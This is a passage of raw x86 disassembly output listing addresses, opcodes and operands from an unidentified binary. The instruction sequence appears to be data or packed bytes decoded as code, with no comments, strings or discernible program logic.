  40479c:	lea    esp,[ebx]
  40479e:	adc    eax,0x20233480
  4047a3:	inc    eax
  4047a4:	adc    BYTE PTR [eax],cl
  4047a6:	adc    DWORD PTR [eax],eax
  4047a8:	loopne 0x404812
  4047aa:	or     BYTE PTR [eax],al
  4047ac:	pop    es
  4047ad:	add    BYTE PTR [ebx],al
  4047af:	and    al,0x8d
  4047b1:	xchg   DWORD PTR [ecx],eax
  4047b3:	and    BYTE PTR [eax],bl
  4047b5:	sbb    BYTE PTR [eax+0x511001a4],ah
  4047bb:	pop    ds
  4047bc:	popa   
  4047bd:	add    cl,BYTE PTR [edx]
  4047bf:	push   0xe13b842
  4047c4:	and    BYTE PTR [eax+0x2],dl
  4047c7:	or     DWORD PTR [edx+ebp*1],ecx
  4047ca:	inc    esp
  4047cb:	adc    BYTE PTR [eax+0x0],al
  4047ce:	adc    al,0x40
  4047d0:	and    al,0x0
  4047d2:	enter  0x4220,0x52
  4047d6:	shr    BYTE PTR [edi-0x2bfb8740],1
  4047dc:	bound  eax,QWORD PTR [edi]
  4047de:	sub    edx,eax
  4047e0:	inc    eax
  4047e1:	add    BYTE PTR [eax],ch
  4047e3:	add    BYTE PTR [eax],ch
  4047e5:	sbb    al,0x36
  4047e7:	add    DWORD PTR [ecx-0x5ff1bdf8],edi
  4047ed:	mov    ah,BYTE PTR [eax+0x4a]
  4047f0:	adc    ebp,DWORD PTR [eax+0x4]
  4047f3:	adc    BYTE PTR [edx],dl
  4047f5:	inc    eax
  4047f6:	sbb    al,bl
  4047f8:	cwde   
  4047f9:	nop
  4047fa:	or     al,0x41
  4047fc:	inc    eax
  4047fd:	ror    ah,0xc0
  404800:	inc    eax
  404801:	add    BYTE PTR [edx+0x33a0490c],ch
  404807:	add    BYTE PTR [edi+0x29],dh
  40480a:	mov    al,ds:0x2000a882
  40480f:	psubusb mm2,QWORD PTR [eax]
  404812:	add    BYTE PTR [edx+0x8],dl
  404815:	inc    ebp
  404816:	ret    0x16b7
  404819:	add    al,BYTE PTR [ebp+0x0]
  40481c:	test   DWORD PTR ds:0x20128008,esp
  404822:	add    ch,BYTE PTR [eax]
  404824:	dec    edx
  404825:	test   BYTE PTR [eax+0x0],ah
  404828:	test   BYTE PTR [edx+0x49000900],al
  40482e:	les    eax,FWORD PTR [edx]
  404830:	dec    ebp
  404831:	inc    eax
  404832:	and    DWORD PTR [eax-0x7a],eax
  404835:	rol    DWORD PTR [ecx-0x6c],0x6
  404839:	sbb    BYTE PTR [eax],al
  40483b:	sbb    dl,BYTE PTR [edx+0x46]
  40483e:	cbw    
  404840:	arpl   WORD PTR [edx],ax
  404842:	sbb    BYTE PTR [eax+eax*1],0x6
  404846:	nop
  404847:	dec    eax
  404848:	test   BYTE PTR [ecx+0x5d100c2],al
  40484e:	sub    DWORD PTR [edi+0x884048],0xc1c80802
  404858:	add    BYTE PTR [esi],al
  40485a:	or     BYTE PTR [eax],ah
  40485c:	sbb    BYTE PTR [eax],cl
  40485e:	adc    DWORD PTR [eax],eax
  404860:	inc    eax
  404861:	or     eax,0x4329240
  404866:	cmp    BYTE PTR ds:0x28004420,0x30
  40486d:	sub    al,0x22
  40486f:	add    BYTE PTR [edx+0xa00c212],dl
  404875:	and    al,0xe0
  404877:	add    BYTE PTR [ecx],al
  404879:	adc    DWORD PTR [eax+0x8131420],eax
  40487f:	push   ecx
  404880:	adc    eax,0x9804a874
  404885:	add    al,0x20
  404887:	adc    BYTE PTR [eax],al
  404889:	add    DWORD PTR [edx+0x60040008],ebx
  40488f:	push   es
  404890:	inc    ecx
  404891:	or     BYTE PTR [eax+0x14],dl
  404894:	add    DWORD PTR [esi+0x5364a8d5],edx
  40489a:	add    eax,eax
  40489c:	and    BYTE PTR [ecx],0x0
  40489f:	and    al,0xa8
  4048a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048a2:	xor    BYTE PTR [edx-0x5c],al
  4048a5:	inc    eax
  4048a6:	lea    eax,[edx]
  4048a8:	and    BYTE PTR [ecx-0x68],ah
  4048ab:	mov    al,ds:0xa08a3260
  4048b0:	bound  eax,QWORD PTR [edx+0x41]
  4048b3:	inc    eax
  4048b4:	mov    al,0x8
  4048b6:	add    BYTE PTR [eax],al
  4048b8:	pop    edx
  4048b9:	shl    BYTE PTR [edx+0x22],0x0
  4048bd:	adc    DWORD PTR [eax+0xd0314ac],edx
  4048c3:	and    BYTE PTR [edx-0x3e6cd3c0],al
  4048c9:	add    BYTE PTR [ebx-0x7b7dfbac],dh
  4048cf:	inc    esi
  4048d0:	and    BYTE PTR ds:0x40000172,cl
  4048d6:	inc    eax
  4048d7:	mov    DWORD PTR [edx],eax
  4048d9:	rol    BYTE PTR [edx],0x81
  4048dc:	add    al,0x0
  4048de:	adc    al,0x50
  4048e0:	and    dl,BYTE PTR [eax]
  4048e2:	mov    bl,0x64
  4048e4:	mov    ds:0x70100adc,eax
  4048e9:	mov    al,ds:0x21c20404
  4048ee:	inc    ebp
  4048ef:	and    DWORD PTR [edx],0x90
  4048f5:	and    DWORD PTR [eax],edx
  4048f7:	and    DWORD PTR [ecx],ebx
  4048f9:	add    ah,0x8b
  4048fc:	add    BYTE PTR [ecx],dl
  4048fe:	cmp    DWORD PTR [eax+0x5208130],0x20890401
  404908:	mov    DWORD PTR [edx],ebx
  40490a:	add    BYTE PTR [eax+0x40],al
  40490d:	adc    BYTE PTR [edi],al
  40490f:	add    BYTE PTR [ecx],dh
  404911:	mov    esp,edx
  404913:	imul   ebp,DWORD PTR [eax+0x48],0x40884020
  40491a:	or     BYTE PTR [eax],ch
  40491c:	sub    BYTE PTR [eax-0x7efff2f0],dl
  404922:	test   eax,ecx
  404924:	mov    BYTE PTR [eax+0x12],ah
  404927:	nop
  404928:	and    BYTE PTR [eax+0x8],0xa7
  40492c:	add    BYTE PTR [ebp+0x2c],dl
  40492f:	push   eax
  404930:	inc    eax
  404931:	add    BYTE PTR [eax],al
  404933:	loop   0x40493d
  404935:	inc    eax
  404936:	add    BYTE PTR [ecx],al
  404938:	add    BYTE PTR [eax],al
  40493a:	dec    ecx
  40493b:	pusha  
  40493c:	sbb    DWORD PTR [edx],edx
  40493e:	and    al,BYTE PTR [eax-0x15d27fb0]
  404944:	or     BYTE PTR [ecx+0xc89000],ah
  40494a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40494b:	stos   DWORD PTR es:[edi],eax
  40494c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40494d:	data16 test BYTE PTR [eax-0x42],al
  404951:	inc    ecx
  404952:	sbb    BYTE PTR [eax],dl
  404954:	inc    edx
  404955:	sub    eax,0x110aca0e
  40495a:	inc    eax
  40495b:	and    BYTE PTR [ebp+0x110c4d8],al
  404961:	and    eax,0x1e210045
  404966:	inc    edx
  404967:	xchg   esp,eax
  404968:	add    al,0x0
  40496a:	add    DWORD PTR [edx+edx*1],0xa9849068
  404971:	push   es
  404972:	add    BYTE PTR [edx],al
  404974:	push   cs
  404975:	nop
  404976:	add    eax,0xa084158
  40497b:	sbb    al,0xa7
  40497d:	add    ch,BYTE PTR [esi*1+0x54410500]
  404984:	push   ss
  404985:	and    DWORD PTR [esi],eax
  404987:	add    BYTE PTR [eax],al
  404989:	add    BYTE PTR [esp+eax*1+0x482d06b5],dl
  404990:	mov    ds:0x62443014,al
  404995:	add    DWORD PTR [eax+eax*4],0x1e
  404999:	inc    esp
  40499a:	add    BYTE PTR [eax+eax*1],0x4
  40499e:	push   eax
  40499f:	mov    ch,0x8c
  4049a1:	mov    BYTE PTR [ecx+edx*1],ch
  4049a4:	loopne 0x4049a6
  4049a6:	xor    al,0x34
  4049a8:	add    BYTE PTR [ebx],0x10
  4049ab:	mov    es,WORD PTR [eax+0xb]
  4049ae:	mov    dl,0x10
  4049b0:	add    al,0x24
  4049b2:	sbb    ah,al
  4049b4:	test   BYTE PTR [edi],al
  4049b6:	or     BYTE PTR [eax-0x4afaf6fd],al
  4049bc:	pusha  
  4049bd:	test   BYTE PTR [edx],cl
  4049bf:	push   es
  4049c0:	adc    eax,DWORD PTR [eax+0x0]
  4049c3:	mov    al,ds:0x24208c34
  4049c8:	test   al,0x31
  4049ca:	inc    edx
  4049cb:	push   eax
  4049cc:	adc    BYTE PTR [eax+eiz*2],ah
  4049cf:	adc    BYTE PTR [edx+0x24],al
  4049d2:	push   eax
  4049d3:	sub    BYTE PTR [eax+0x10],al
  4049d6:	inc    eax
  4049d7:	inc    esp
  4049d8:	add    DWORD PTR [eax+0x9002a2],ebx
  4049de:	or     BYTE PTR [edx],cl
  4049e0:	or     BYTE PTR [eax+0x2],0x8
  4049e4:	add    BYTE PTR [esi],0x48
  4049e7:	xor    al,0x90
  4049e9:	and    eax,DWORD PTR ds:0x37190536
  4049ef:	add    BYTE PTR [edx],al
  4049f1:	or     BYTE PTR [eax],al
  4049f3:	push   edx
  4049f4:	dec    edx
  4049f5:	pop    eax
  4049f6:	adc    BYTE PTR [eax-0x7df2f7eb],al
  4049fc:	add    BYTE PTR [eax],0x12
  4049ff:	inc    edx
  404a00:	add    BYTE PTR [eax-0x7bffc9f8],cl
  404a06:	push   ebp
  404a07:	adc    BYTE PTR [eax],cl
  404a09:	adc    dl,BYTE PTR [edx]
  404a0b:	or     BYTE PTR [esi],ch
  404a0d:	add    DWORD PTR [eax],esi
  404a0f:	inc    esp
  404a10:	add    cl,BYTE PTR ds:0x90100110
  404a16:	dec    eax
  404a17:	add    BYTE PTR [eax],dl
  404a19:	test   eax,0x10420512
  404a1e:	add    eax,DWORD PTR [eax]
  404a20:	shl    BYTE PTR [ebx],0x10
  404a23:	sub    DWORD PTR [edx],esp
  404a25:	sub    al,0x95
  404a27:	popa   
  404a28:	add    DWORD PTR [eax],eax
  404a2a:	fwait
  404a2b:	adc    BYTE PTR [ecx-0x1f6fad5f],al
  404a31:	adc    BYTE PTR [esi+0x8],dl
  404a34:	add    BYTE PTR [eax],dl
  404a36:	gs mov esp,0x62c8800b
  404a3c:	mov    al,ds:0x1081031
  404a41:	loopne 0x404a6b
  404a43:	and    BYTE PTR [ecx-0x72],0x40
  404a47:	adc    BYTE PTR [ebx],al
  404a49:	or     BYTE PTR [esi+ecx*1-0x5dfafc00],dl
  404a50:	int3   
  404a51:	adc    BYTE PTR [esi+ebx*1],dl
  404a54:	dec    ecx
  404a55:	rol    DWORD PTR [edx],0x28
  404a58:	pop    edi
  404a59:	pusha  
  404a5a:	dec    eax
  404a5b:	sbb    al,0x4c
  404a5d:	add    BYTE PTR [ecx],0x40
  404a60:	and    BYTE PTR [edx],0x32
  404a63:	or     al,0x2
  404a65:	inc    eax
  404a66:	adc    al,0x8
  404a68:	adc    BYTE PTR [ecx],al
  404a6a:	jno    0x404a7c
  404a6c:	add    eax,0x43004109
  404a71:	and    bl,al
  404a73:	add    BYTE PTR [esi],cl
  404a75:	sub    DWORD PTR [esi],eax
  404a77:	xchg   esp,eax
  404a78:	add    al,0x54
  404a7a:	adc    al,dl
  404a7c:	push   es
  404a7d:	xchg   esi,eax
  404a7e:	add    al,BYTE PTR [eax+eiz*4]
  404a81:	xor    dl,cl
  404a83:	or     DWORD PTR [ecx+0x5804638c],edx
  404a89:	add    DWORD PTR [eax],ebx
  404a8b:	and    DWORD PTR [esi],esp
  404a8d:	add    BYTE PTR ds:0x90888018,0x83
  404a94:	push   ss
  404a95:	or     BYTE PTR [esi+0x48a90428],dl
  404a9b:	push   eax
  404a9c:	add    DWORD PTR [edx],esi
  404a9e:	adc    al,0x51
  404aa0:	int3   
  404aa1:	sbb    BYTE PTR [eax+eax*2+0x2265668],cl
  404aa8:	inc    edx
  404aa9:	pushf  
  404aaa:	xchg   esp,eax
  404aab:	add    BYTE PTR [esp],al
  404aae:	sbb    BYTE PTR [ebx+0x2490c11],al
  404ab4:	push   es
  404ab5:	call   0x281a6bb
  404aba:	dec    eax
  404abb:	test   DWORD PTR [eax],ebp
  404abd:	pop    eax
  404abe:	or     BYTE PTR [ecx],bh
  404ac0:	add    DWORD PTR [edi],0xffffff98
  404ac3:	adc    BYTE PTR [eax],ah
  404ac5:	and    esp,eax
  404ac7:	or     DWORD PTR ds:0xa2004008,0x10084b08
  404ad1:	push   eax
  404ad2:	or     BYTE PTR [esi+eiz*1],bl
  404ad5:	add    BYTE PTR [ecx+0x6454938b],al
  404adb:	and    eax,DWORD PTR [edx]
  404add:	and    BYTE PTR [edx],al
  404adf:	adc    al,BYTE PTR [ecx+eax*1]
  404ae2:	add    DWORD PTR [eax+0x38],esp
  404ae5:	aaa    
  404ae6:	add    BYTE PTR [ecx],bl
  404ae8:	xor    BYTE PTR [ebp-0x5f6fdc98],cl
  404aee:	and    dl,0x0
  404af1:	add    BYTE PTR fs:[esi],al
  404af4:	inc    eax
  404af5:	sbb    eax,DWORD PTR [ecx+0x10]
  404af8:	sbb    BYTE PTR [edx],cl
  404afa:	push   cs
  404afb:	cmp    DWORD PTR [edx],eax
  404afd:	dec    eax
  404afe:	or     al,0x22
  404b00:	add    al,BYTE PTR [eax+0x42]
  404b03:	and    BYTE PTR [edx+0x20],dl
  404b06:	shl    BYTE PTR [ebp+0x10],0xc8
  404b0a:	les    ecx,FWORD PTR [ebp-0x7bdf7f18]
  404b10:	test   DWORD PTR [eax+0x51000005],esi
  404b16:	and    BYTE PTR [edx+eax*4],al
  404b19:	push   edx
  404b1a:	add    BYTE PTR [eax+0x1],ah
  404b1d:	add    al,BYTE PTR [ecx+0x64]
  404b20:	xor    eax,0xdd5822ab
  404b25:	add    edx,DWORD PTR [ecx+0x10]
  404b28:	add    dl,al
  404b2a:	adc    edx,DWORD PTR [eax]
  404b2c:	or     BYTE PTR [edx+0x20e0c400],dl
  404b32:	enter  0x220,0x60
  404b36:	add    dh,BYTE PTR [esi*4-0x5f7eefec]
  404b3d:	inc    ebp
  404b3e:	inc    eax
  404b3f:	cmp    BYTE PTR [esi+0x1c240248],al
  404b45:	adc    al,BYTE PTR [eax]
  404b47:	or     BYTE PTR [eax],ah
  404b49:	and    BYTE PTR [eax+eax*1],0x22
  404b4d:	and    al,0x1
  404b4f:	inc    ecx
  404b50:	test   BYTE PTR [esp+eax*1],al
  404b53:	dec    eax
  404b54:	cmp    DWORD PTR [ebx+edx*8],eax
  404b57:	xchg   BYTE PTR [edx-0x7e],ch
  404b5a:	and    DWORD PTR [ebx+0x4006c038],eax
  404b60:	or     DWORD PTR [eax],esp
  404b62:	sub    DWORD PTR [eax-0x7e],esp
  404b65:	add    BYTE PTR [edx],0x0
  404b68:	or     BYTE PTR [eax],al
  404b6a:	add    ch,BYTE PTR [ecx-0x3df5efe0]
  404b70:	cwde   
  404b71:	add    al,0x80
  404b73:	adc    BYTE PTR [ecx],dl
  404b75:	adc    DWORD PTR [edx],eax
  404b77:	adc    al,0x50
  404b79:	xor    dh,BYTE PTR [esi]
  404b7b:	add    BYTE PTR [eax-0x74],ch
  404b7e:	xchg   edx,eax
  404b7f:	xor    al,al
  404b81:	add    al,0xb
  404b83:	mov    al,ds:0x92846141
  404b88:	inc    esp
  404b89:	lea    ecx,[eax-0x688ffb6d]
  404b8f:	add    BYTE PTR [ecx+0x20],al
  404b92:	add    al,0x0
  404b94:	lods   al,BYTE PTR ds:[esi]
  404b95:	add    BYTE PTR [ebx],al
  404b97:	inc    eax
  404b98:	add    BYTE PTR [eax],dl
  404b9a:	sbb    BYTE PTR [ebx],ah
  404b9c:	lds    edx,FWORD PTR [eax+0x43]
  404b9f:	rol    BYTE PTR [eax],0xdc
  404ba2:	inc    esp
  404ba3:	adc    BYTE PTR [edx+0x38748343],cl
  404ba9:	add    eax,0x24947084
  404bae:	sub    ah,BYTE PTR [ecx]
  404bb0:	add    DWORD PTR [eax+edx*1],eax
  404bb3:	and    DWORD PTR [esi+0x6],0x1
  404bb7:	and    BYTE PTR [edi],ah
  404bb9:	and    dh,BYTE PTR [edx]
  404bbb:	and    BYTE PTR [eax],bh
  404bbd:	xchg   BYTE PTR [eax+esi*4+0x28],al
  404bc1:	add    BYTE PTR [eax],ch
  404bc3:	add    BYTE PTR [edx],dl
  404bc5:	add    BYTE PTR [ecx+ebx*2+0x20],al
  404bc9:	inc    eax
  404bca:	adc    BYTE PTR [edx],ah
  404bcc:	adc    ch,0x8a
  404bcf:	mov    eax,ds:0x4032c791
  404bd4:	sbb    DWORD PTR [eax],eax
  404bd6:	and    al,ch
  404bd8:	add    dl,BYTE PTR [ecx]
  404bda:	sub    BYTE PTR [eax+0x200b0008],cl
  404be0:	push   ecx
  404be1:	add    al,0x11
  404be3:	inc    ecx
  404be4:	add    BYTE PTR [eax],0x18
  404be7:	add    BYTE PTR [ebx],dh
  404be9:	or     BYTE PTR [edx],al
  404beb:	add    al,0x34
  404bed:	sbb    BYTE PTR [ebx],bh
  404bef:	add    ch,BYTE PTR [ecx+esi*4]
  404bf2:	add    al,BYTE PTR [esi]
  404bf4:	xchg   ecx,eax
  404bf5:	adc    al,0x0
  404bf7:	add    BYTE PTR es:[ecx+edx*4-0x37def000],0x70
  404c00:	mov    eax,ds:0x40c00480
  404c05:	add    BYTE PTR [edi],al
  404c07:	inc    eax
  404c08:	add    DWORD PTR [eax+eax*1],eax
  404c0b:	or     DWORD PTR [eax],eax
  404c0d:	adc    eax,0x30000400
  404c12:	into   
  404c13:	push   ebp
  404c14:	or     BYTE PTR [eax+0x8],al
  404c17:	push   eax
  404c18:	and    al,0xc8
  404c1a:	nop
  404c1b:	add    DWORD PTR [eax],esi
  404c1d:	cmp    DWORD PTR [eax],eax
  404c1f:	add    BYTE PTR [edx-0x5bf79fca],dl
  404c25:	mov    BYTE PTR [eax],cl
  404c27:	adc    BYTE PTR [eax+0x140b80b],dl
  404c2d:	sbb    BYTE PTR [ebp-0x80],dl
  404c30:	add    al,0x42
  404c32:	rcl    BYTE PTR [eax+0x18020094],0x48
  404c39:	add    BYTE PTR [eax+ebx*4],bh
  404c3c:	or     BYTE PTR [edx],al
  404c3e:	mov    DWORD PTR [eax],eax
  404c40:	add    eax,DWORD PTR [eax]
  404c42:	add    BYTE PTR [edx],dl
  404c44:	adc    DWORD PTR [ebp+0xe],eax
  404c47:	xor    al,0x45
  404c49:	inc    eax
  404c4a:	add    BYTE PTR [ecx],al
  404c4c:	test   DWORD PTR [eax],esp
  404c4e:	or     DWORD PTR [eax],eax
  404c50:	add    al,0x20
  404c52:	sbb    BYTE PTR [eax],al
  404c54:	and    al,BYTE PTR [edx+0x1]
  404c57:	mov    BYTE PTR [eax+edi*1+0xa],al
  404c5b:	inc    ecx
  404c5c:	jo     0x404c64
  404c5e:	and    DWORD PTR [eax+eax*2+0x70],0x1560492
  404c66:	and    ah,0x81
  404c69:	add    al,BYTE PTR [ecx+0x4]
  404c6c:	add    dl,cl
  404c6e:	add    DWORD PTR [ecx],eax
  404c70:	xchg   esi,eax
  404c71:	or     BYTE PTR [edx+0x1e442060],al
  404c77:	add    BYTE PTR [eax],al
  404c79:	nop
  404c7a:	inc    ebx
  404c7b:	sub    DWORD PTR [ecx+0x620021b],ecx
  404c81:	adc    BYTE PTR [eax+eax*1],bl
  404c84:	xor    eax,DWORD PTR [eax]
  404c86:	dec    eax
  404c87:	jecxz  0x404c89
  404c89:	add    DWORD PTR [ecx+0x19],0x980448d0
  404c90:	xor    BYTE PTR [ecx+0x19],al
  404c93:	add    DWORD PTR [edx-0x76fbffee],eax
  404c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c9a:	adc    DWORD PTR [eax],esp
  404c9c:	add    edx,DWORD PTR [ecx+0x11288202]
  404ca2:	enter  0x4840,0xd0
  404ca6:	popa   
  404ca7:	inc    esp
  404ca8:	or     dh,BYTE PTR [ebx]
  404caa:	add    al,0x41
  404cac:	test   BYTE PTR [edx],al
  404cae:	inc    eax
  404caf:	xchg   edx,eax
  404cb0:	dec    edx
  404cb1:	inc    ecx
  404cb2:	and    al,0xc4
  404cb4:	adc    BYTE PTR [edx],dl
  404cb6:	adc    al,0x1
  404cb8:	ret    0x2d10
  404cbb:	mov    ds:0x50101008,eax
  404cc0:	and    al,0x31
  404cc2:	dec    esi
  404cc3:	mov    al,ds:0x40219140
  404cc8:	es push es
  404cca:	add    BYTE PTR [edx+0x7d310404],0x10
  404cd1:	and    DWORD PTR [eax],ecx
  404cd3:	or     BYTE PTR [ecx+eax*2],dl
  404cd6:	and    BYTE PTR [esp+eax*1+0x8],cl
  404cda:	inc    esi
  404cdb:	dec    esp
  404cdc:	add    BYTE PTR [esi-0x677f3bfc],0x51
  404ce3:	add    eax,0x2062222
  404ce8:	sub    BYTE PTR [ecx+0x4],ah
  404ceb:	or     BYTE PTR [ebx+edx*1],0x8
  404cef:	add    BYTE PTR [ecx-0xeecc000],dh
  404cf5:	add    BYTE PTR [eax],ch
  404cf7:	dec    eax
  404cf8:	adc    bl,BYTE PTR [ecx]
  404cfa:	add    al,0xd0
  404cfc:	sub    DWORD PTR [edx+0x0],edx
  404cff:	or     eax,0xe200820
  404d04:	and    DWORD PTR [ebx],eax
  404d06:	pusha  
  404d07:	pop    eax
  404d08:	popf   
  404d09:	sbb    edx,edi
  404d0b:	and    BYTE PTR [ecx],0x2c
  404d0e:	and    al,0x70
  404d10:	add    al,BYTE PTR [eax]
  404d12:	adc    al,0x1
  404d14:	or     BYTE PTR [edx],bh
  404d16:	adc    al,0x4
  404d18:	or     dl,BYTE PTR [eax+0x15800002]
  404d1e:	mov    eax,ds:0x14b0d041
  404d23:	xor    BYTE PTR [edx-0x20],dl
  404d26:	popa   
  404d27:	and    BYTE PTR [esi+0x16],cl
  404d2a:	add    al,0x83
  404d2c:	inc    esp
  404d2d:	repnz adc BYTE PTR [ecx+0x82000a],ah
  404d34:	popa   
  404d35:	rol    BYTE PTR [eax],cl
  404d37:	pop    ds
  404d38:	and    BYTE PTR [eax+0x49],ah
  404d3b:	or     al,0x8
  404d3d:	mov    al,0xd
  404d3f:	adc    BYTE PTR [eax],al
  404d41:	inc    eax
  404d42:	inc    eax
  404d43:	jge    0x404d55
  404d45:	push   edx
  404d46:	adc    BYTE PTR [ecx],ah
  404d48:	add    BYTE PTR [ecx+0xe184048],al
  404d4e:	add    BYTE PTR [eax],al
  404d50:	adc    eax,DWORD PTR [ebx+0xcc4a8e]
  404d56:	loope  0x404db8
  404d58:	and    eax,0x548620
  404d5d:	push   ss
  404d5e:	sub    edi,DWORD PTR [ebp+0x4]
  404d61:	and    BYTE PTR [eax+0x76],al
  404d64:	and    BYTE PTR [edx-0x47],bl
  404d67:	xchg   edx,eax
  404d68:	pop    ebp
  404d69:	dec    esp
  404d6a:	out    0x23,eax
  404d6c:	add    BYTE PTR [eax],dl
  404d6e:	inc    esp
  404d6f:	and    al,BYTE PTR [eax]
  404d71:	add    BYTE PTR [ecx-0x1c],bl
  404d74:	add    DWORD PTR [ecx+0x40008c50],eax
  404d7a:	add    al,0x8
  404d7c:	adc    al,0xb
  404d7e:	inc    ecx
  404d7f:	push   cs
  404d80:	adc    DWORD PTR [edx+eiz*1],eax
  404d83:	inc    eax
  404d84:	bound  esi,QWORD PTR [eax]
  404d86:	and    BYTE PTR [eax],al
  404d88:	add    bl,0xa0
  404d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d8c:	add    BYTE PTR [eax],al
  404d8e:	xchg   edx,eax
  404d8f:	and    dl,BYTE PTR [ebx-0x68]
  404d92:	mov    BYTE PTR [edx+eiz*2],cl
  404d95:	test   BYTE PTR [ecx+eax*2],bh
  404d98:	inc    ecx
  404d99:	push   edx
  404d9a:	adc    al,0xc
  404d9c:	cmp    edx,DWORD PTR [eax+ecx*2]
  404d9f:	enter  0xd85,0x2
  404da3:	add    BYTE PTR [ecx],ch
  404da5:	push   es
  404da6:	and    BYTE PTR [ecx],dl
  404da8:	xchg   BYTE PTR [esi+0x30004100],al
  404dae:	stos   BYTE PTR es:[edi],al
  404daf:	or     BYTE PTR [eax],al
  404db1:	add    BYTE PTR [esi+eax*1+0x0],al
  404db5:	push   ebx
  404db6:	add    DWORD PTR [ebx],eax
  404db8:	adc    al,0xa0
  404dba:	adc    dl,BYTE PTR [eax]
  404dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dbd:	adc    eax,DWORD PTR [eax]
  404dbf:	bound  eax,QWORD PTR [ecx]
  404dc1:	inc    esp
  404dc2:	add    BYTE PTR [edx+ebx*1],al
  404dc5:	add    al,0x24
  404dc7:	or     al,dl
  404dc9:	or     al,0x40
  404dcb:	add    DWORD PTR ds:0x202800de,eax
  404dd1:	sbb    al,0xac
  404dd3:	xor    DWORD PTR [eax-0x58],0xffffff80
  404dd7:	add    ah,BYTE PTR [eax+0x52408617]
  404ddd:	add    ecx,DWORD PTR ds:0x805409
  404de3:	or     al,0x0
  404de5:	add    BYTE PTR [eax+0x10],dl
  404de8:	inc    esp
  404de9:	sub    BYTE PTR [eax],al
  404deb:	inc    edx
  404dec:	mov    BYTE PTR [ebp+0x8],cl
  404def:	add    BYTE PTR [eax],0x80
  404df2:	sbb    edx,DWORD PTR ss:[eax]
  404df5:	and    esp,ecx
  404df7:	add    al,0x18
  404df9:	and    dl,BYTE PTR [eax]
  404dfb:	add    BYTE PTR [edx],ah
  404dfd:	inc    esp
  404dfe:	add    BYTE PTR [eax],cl
  404e00:	inc    esp
  404e01:	sub    BYTE PTR [eax],al
  404e03:	xor    BYTE PTR [eax+0x5],al
  404e06:	inc    eax
  404e07:	test   DWORD PTR [ecx+0x50b93425],eax
  404e0d:	ins    BYTE PTR es:[edi],dx
  404e0e:	je     0x404e13
  404e10:	add    eax,DWORD PTR [ecx]
  404e12:	das    
  404e13:	xchg   esp,eax
  404e14:	adc    eax,0xc5000839
  404e19:	inc    edx
  404e1a:	or     BYTE PTR [edx],0x40
  404e1d:	or     al,0xa3
  404e1f:	and    BYTE PTR [ecx],dl
  404e21:	add    BYTE PTR [eax],al
  404e23:	popa   
  404e24:	adc    BYTE PTR [eax],cl
  404e26:	push   ss
  404e27:	xor    eax,0x53000e88
  404e2c:	mov    al,0x1
  404e2e:	nop
  404e2f:	test   DWORD PTR [edx+0x50c03],esp
  404e35:	ins    BYTE PTR es:[edi],dx
  404e36:	and    BYTE PTR [eax+ecx*4+0x40],al
  404e3a:	rol    DWORD PTR [ebx],0xb0
  404e3d:	and    BYTE PTR [edx+0x208440],bh
  404e43:	inc    eax
  404e44:	and    dl,BYTE PTR [edi]
  404e46:	add    BYTE PTR [ecx+0x44c15000],0x43
  404e4d:	adc    al,BYTE PTR [eax+0x2]
  404e50:	arpl   WORD PTR [ecx],dx
  404e52:	sub    al,BYTE PTR [ecx+0x7018f850]
  404e58:	sbb    eax,DWORD PTR [edx]
  404e5a:	and    al,BYTE PTR [eax]
  404e5c:	adc    ah,BYTE PTR [eax+eax*1-0x70]
  404e60:	add    al,BYTE PTR [edx]
  404e62:	int3   
  404e63:	and    cl,BYTE PTR [ebx+0x50400058]
  404e69:	mov    al,ds:0x12043321
  404e6e:	mov    BYTE PTR [eax+0x1],cl
  404e71:	xchg   ecx,eax
  404e72:	cmp    BYTE PTR ds:0x59820440,ch
  404e78:	test   BYTE PTR [eax+0x13000600],cl
  404e7e:	loopne 0x404ec2
  404e80:	add    DWORD PTR [edi+0x8b00dc],edx
  404e86:	add    BYTE PTR [ecx+0x38],bl
  404e89:	nop
  404e8a:	and    BYTE PTR [edx],dl
  404e8c:	or     BYTE PTR [edx-0x797f7afe],dl
  404e92:	bound  eax,QWORD PTR [eax]
  404e94:	push   ss
  404e95:	and    BYTE PTR ds:0x70b62c21,al
  404e9b:	add    DWORD PTR [eax],eax
  404e9d:	xchg   ecx,eax
  404e9e:	add    BYTE PTR [edi],ah
  404ea0:	sbb    BYTE PTR [edx+eax*1+0x14001104],al
  404ea7:	inc    eax
  404ea8:	in     al,0xc
  404eaa:	add    BYTE PTR [eax],al
  404eac:	or     al,0x4
  404eae:	add    BYTE PTR [eax],al
  404eb0:	and    al,0x64
  404eb2:	and    BYTE PTR [eax],dl
  404eb4:	adc    DWORD PTR [ecx],eax
  404eb6:	add    al,BYTE PTR [eax]
  404eb8:	dec    ebp
  404eb9:	or     BYTE PTR [eax-0x7ffbfffd],al
  404ebf:	and    DWORD PTR [eax+0x0],0x50404004
  404ec6:	and    BYTE PTR [esp+eax*1],0xc1
  404eca:	xor    al,0x3c
  404ecc:	add    al,0x4a
  404ece:	push   es
  404ecf:	mov    BYTE PTR [eax+0x10842800],dl
  404ed5:	add    BYTE PTR cs:[eax-0x78],ah
  404ed9:	add    al,0x81
  404edb:	add    ecx,eax
  404edd:	add    cl,BYTE PTR [ecx+0x0]
  404ee0:	retf   
  404ee1:	inc    eax
  404ee2:	add    BYTE PTR [eax+eax*1+0x1084a0a],al
  404ee9:	inc    ebp
  404eea:	add    BYTE PTR [ecx+0x0],al
  404eed:	or     BYTE PTR [edx+0x600400d],0x26
  404ef4:	jmp    0x404f4e
  404ef6:	add    BYTE PTR [eax],dl
  404ef8:	and    DWORD PTR [ebx+0x40681189],eax
  404efe:	inc    eax
  404eff:	add    ecx,DWORD PTR ds:0x2120a40
  404f05:	push   ebx
  404f06:	add    bh,dl
  404f08:	ret    0x2100
  404f0b:	add    ah,BYTE PTR [eax+0x12]
  404f0e:	or     BYTE PTR [eax+0x33],al
  404f11:	add    BYTE PTR [ecx],cl
  404f13:	inc    eax
  404f14:	add    ah,BYTE PTR [esi+0x4005801]
  404f1a:	sbb    cl,BYTE PTR [eax+0x15]
  404f1d:	adc    DWORD PTR [edx],eax
  404f1f:	add    BYTE PTR [eax+0x40100c],bl
  404f25:	push   ebp
  404f26:	add    DWORD PTR [edx],eax
  404f28:	stos   BYTE PTR es:[edi],al
